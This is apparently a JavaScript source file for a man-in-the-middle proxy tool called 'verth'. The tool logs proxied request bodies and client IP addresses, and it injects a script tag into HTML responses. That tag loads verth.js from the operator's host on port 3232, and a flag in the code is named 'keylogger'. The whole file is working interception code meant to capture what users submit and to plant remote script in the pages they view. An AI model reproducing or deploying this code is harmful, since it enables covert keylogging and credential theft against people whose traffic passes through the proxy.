const http = require('http')
const util =  require('util');
const ip   =  require('ip');
const events =  require('events');
const connect =  require('connect');
const httpProxy =  require('http-proxy');
const bodyParser = require('body-parser');
const child_process =  require('child_process');
const transformerProxy =  require('transformer-proxy');
const exec = child_process.exec;

var verthproxy = require('../utils/proxy')


var exports = module.exports = new events.EventEmitter();

var trace = {}

var keylogger = 0

var hostIP = ip.address()

var init = function (options) {
  options = options || { port: 8080 }
  var proxy = httpProxy.createServer({
    target: 'http://'+hostIP+':10000'
  , ws: true
  });
  proxy.on('proxyReq', request);
  proxy.on('proxyRes', response);
  proxy.on('error', function(err, req, res) {
    res.end();
  })
  var app = connect();
  app.use(bodyParser.json());
  app.use(bodyParser.urlencoded({ extended: true }));
  app.use(transformerProxy(inject));  // , {match : /\.js([^\w]|$)/}
  app.use( function (req, res) {
    if (req.headers.host == hostIP+':3232') {
      console.log("porting to verth io");
      proxy.web(req, res, { target: 'http://'+hostIP+':3232' });
    } else {
      proxy.web(req, res, { target: 'http://'+hostIP+':10000' });
    }
    req.on('end', function(){
      setTimeout(function(){
        keylogger = 0
      }, 100)
    })
  });
  http.createServer(app).listen(options.port);
}

var request = function (proxyRequest, req, res, options) {
  trace.code = res.statusCode
  trace.method = proxyRequest.method
  trace.url = proxyRequest.agent.protocol + '//' + req.headers.host + proxyRequest.path
  trace.body = {}
  if (req.body.length) {
    trace.body = req.body
    console.log("REQUEST-BODY", req.body);
  }
}

var response = function (proxyResponse, req, res) {
  proxyResponse.on('end', function(){
    var headers = parser.headers(proxyResponse.headers)                                          // Template Engine?
    if (headers != false) {
      var ipAddr = req.headers["x-forwarded-for"];
      if (ipAddr){
        var list = ipAddr.split(",");
        ipAddr = list[list.length-1];
      } else {
        ipAddr = req.connection.remoteAddress;
      }
      ipAddr = ipAddr.split(':')
      ipAddr = ipAddr[ipAddr.length - 1]
      exports.emit('trace', {
        url: trace.url
      , method: trace.method
      , ip: ipAddr
      , code: trace.code
      , headers: headers
      , body: trace.body
      });
    }
  })
}

var parser = {
  headers: function(headers) {
    if ( (typeof headers['content-length'] == "undefined") ||
         (typeof headers['content-type'] == "undefined") )
      return false;
    return {
      "mime"  : headers['content-type']
    , "length": headers['content-length']
    , "Cache-Control": "no-cache, no-store, must-revalidate"
    , "Pragma": "no-cache"
    , "Expires": 0
    }
  }
}

var inject = function (data, req) {
  if (typeof req.headers.accept != "undefined") {
    var mime = req.headers.accept.split(',')                                                                                     // Regex me please :)
    if ( mime[0] == 'text/html' ){
      if ( data.toString('utf8' ).match('<\/body>') ){
        if ( keylogger == 0 ) {
          data = data.toString('utf8').replace('</body>', '<script>var hostIP = "'+hostIP+'";</script><script src="//'+hostIP+':3232/verth.js"></script> \n\n  </body>')       // Abstract
          keylogger = 1
        }
      }
    }
  }
  return data;
}

exports.init = init
